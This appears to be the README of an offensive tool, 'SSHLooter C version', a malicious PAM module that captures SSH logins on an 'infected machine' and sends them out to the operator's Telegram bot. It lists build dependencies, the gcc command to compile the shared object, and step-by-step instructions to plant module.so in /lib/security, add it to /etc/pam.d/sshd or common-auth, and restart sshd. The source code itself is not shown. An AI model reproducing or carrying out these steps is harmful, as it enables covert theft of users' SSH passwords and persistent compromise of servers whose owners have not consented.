# SSHLooter C version
It's the C version of [sshLooter](https://github.com/mthbernardes/sshLooter), which was written in python and have a lot of dependencies to be installed on the infected machine.
Now with this C version, you compile it on your machine and send it to the infected machine without installing any dependencies.

# Dependencies
* gcc
* libcurl4-openssl-dev
* libpam0g-dev
```bash
apt install -y make gcc libcurl4-openssl-dev libpam0g-dev
yum install -y make gcc libcurl-devel openssl-devel pam-devel
```

# Configure
Edit the `looter.c` and add your telegram bot token and your user id.

# Compiling
```bash
gcc -fPIC -shared -o module.so looter.c -lpam -lcurl
#make
#gcc -Werror -Wall -fPIC -shared -Xlinker -x -o module.so looter.c -lcurl
```

# Usage
Copy the `module.so` to the infected machine on `/lib/security`.
```bash
cp module.so /lib/security/ #or /lib64/security/
chmod 755 module.so
```

then edit the `/etc/pam.d/sshd` or `/etc/pam.d/common-auth`,  and add the following lines.
```
auth optional module.so
account optional module.so
```

restart sshd
```
service sshd restart
```
